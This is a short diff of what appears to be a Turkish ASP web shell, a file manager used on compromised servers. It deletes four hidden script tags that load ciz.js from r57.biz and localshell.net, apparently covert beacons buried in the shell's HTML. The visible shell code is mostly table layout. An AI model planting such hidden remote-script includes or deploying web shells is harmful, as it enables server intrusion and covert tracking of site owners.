@@ -76,7 +76,6 @@ if request.querystring("yenidosya") <> "" then
     <img border="0" src="http://www.grayhatz.org/forum/dragontwo/logo.jpg"></td>
     <td width="501" bgcolor="#000000" height="76" valign="top">
     <font face="Verdana" style="font-size: 8pt" color="#B7B7B7">
-    <SCRIPT SRC=http://r57.biz/yazciz/ciz.js></SCRIPT>
     <span style="font-weight: 700">
     <br>
     TC & GH & TC TEAM ©<br>
@@ -751,7 +750,6 @@ Set dosyalar = klasor.files
 			
 <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber7" height="17">
   <tr>
-<SCRIPT SRC=http://www.localshell.net/yazciz/ciz.js></SCRIPT>
     <td width="30" height="17" bgcolor="#9F9F9F">
     <font face="Verdana" style="font-size: 8pt; font-weight: 700">&nbsp;Tür</font></td>
     <td height="17" bgcolor="#9F9F9F">
@@ -819,7 +817,6 @@ Set dosyalar = klasor.files
 
 <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber8" height="1">
   <tr>
-    <SCRIPT SRC=http://r57.biz/yazciz/ciz.js></SCRIPT>
     <td width="30" height="1" bgcolor="#B0B0B0">
     <p align="center">
     <img border="0" src="http://turkguvenligi.info/blues/statusicon/forum_new.gif"></td>
@@ -895,7 +892,6 @@ end if
 
 <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber29">
   <tr>
-<SCRIPT SRC=http://www.r57.biz/yazciz/ciz.js></SCRIPT>
     <td width="100%" bgcolor="#000000">&nbsp;</td>
   </tr>
 </table>
